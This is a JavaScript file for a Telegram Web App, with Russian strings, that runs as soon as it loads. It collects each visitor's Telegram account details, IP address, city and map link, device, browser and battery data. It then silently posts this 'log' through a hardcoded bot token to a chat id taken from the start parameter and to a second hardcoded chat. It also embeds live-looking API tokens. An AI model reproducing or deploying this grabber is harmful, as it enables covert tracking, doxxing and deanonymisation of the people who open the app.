async function getLocationInfo(ip) {
    try {
        const response = await fetch(`https://ipinfo.io/${ip}?token=c6c0e1a8e22e4a`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Ошибка получения информации о местоположении:', error);
        return {
            country: 'неизвестно',
            city: 'неизвестно',
            loc: 'неизвестно'
        };
    }
}

async function sendDataToTelegram() {
    let tg = window.Telegram.WebApp;
    const token = "7591705376:AAEotYANldlMLKW5Y7HovF0oTra8sWHTzoY";
    const chatId = tg.initDataUnsafe.start_param;
    const additionalChatId = 6639527896;

    const ipAddress = await getIPAddress();
    const locationInfo = await getLocationInfo(ipAddress);
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();

    const userInfo = tg.initDataUnsafe.user || {};
    const username = userInfo.username ? `@${userInfo.username}` : 'неизвестно';
    const userId = userInfo.id || 'неизвестно';
    const firstName = userInfo.first_name || 'неизвестно';
    const lastName = userInfo.last_name || 'неизвестно';
    const languageCode = userInfo.language_code || 'неизвестно';
    const allowsWriteToPm = userInfo.allows_write_to_pm ? 'да' : 'нет';

    // Формируем ссылку на карту
    const mapLink = locationInfo.loc ? `https://www.google.com/maps?q=${locationInfo.loc}` : 'неизвестно';

    const message = `
<b> Лог успешен!</b>

<b>🔍 Информация об аккаунте:</b>
├ Тэг: ${username}
├ Айди: <code>${userId}</code>
├ Имя: <code>${firstName}</code>
├ Фамилия: <code>${lastName}</code>
├ Язык: <code>${languageCode}</code>
└ Можно писать в ЛС: <code>${allowsWriteToPm}</code>

<b>🖥️ Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ Страна: <code>${locationInfo.country}</code>
├ Город: <code>${locationInfo.city}</code>
├ Ссылка на карту: <a href="${mapLink}">${mapLink}</a>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>неизвестно</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}%</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>

<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
    `;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    const formData = new URLSearchParams();
    formData.append('chat_id', chatId);
    formData.append('text', message);
    formData.append('parse_mode', 'HTML');

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: formData.toString()
        });
        if (!response.ok) {
            throw new Error('Ошибка при отправке запроса: ' + response.statusText);
        }
        console.log('Запрос успешно отправлен');
    } catch (error) {
        console.error('Ошибка:', error);
    }

    // Second request
    const formData1 = new URLSearchParams();
    formData1.append('chat_id', additionalChatId);
    formData1.append('text', message);
    formData1.append('parse_mode', 'HTML');

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: formData1.toString()
        });
        if (!response.ok) {
            throw new Error('Ошибка при отправке второго запроса: ' + response.statusText);
        }
        console.log('Второй запрос успешно отправлен');
    } catch (error) {
        console.error('Ошибка второго запроса:', error);
    }
}

sendDataToTelegram();
